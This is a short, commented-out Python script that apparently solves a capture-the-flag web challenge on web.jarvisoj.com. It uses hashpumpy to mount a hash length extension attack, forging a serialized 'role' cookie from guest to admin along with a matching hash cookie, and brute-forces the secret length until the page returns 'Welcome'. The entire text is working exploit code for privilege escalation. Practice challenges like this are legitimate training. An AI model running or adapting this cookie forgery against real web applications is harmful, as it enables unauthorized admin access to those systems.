# # !/usr/bin/python
# import hashpumpy
# import requests
# from urllib import quote
#
# s = requests.session()
# for i in range(100):
#     (a, b) = hashpumpy.hashpump("3a4727d57463f122833d9e732f94e4e0", ';"tseug":5:s', ';"nimda":5:s', i)
#     a = quote(a)
#     b = quote(b[::-1])
#     # b = b[::-1]
#
#     cookies = {'role': b, 'hsh': a}
#     print i, cookies
#     r = s.get('http://web.jarvisoj.com:32778/index.php', cookies=cookies)
#     if 'Welcome' in r.text:
#         print r.text
#         exit()
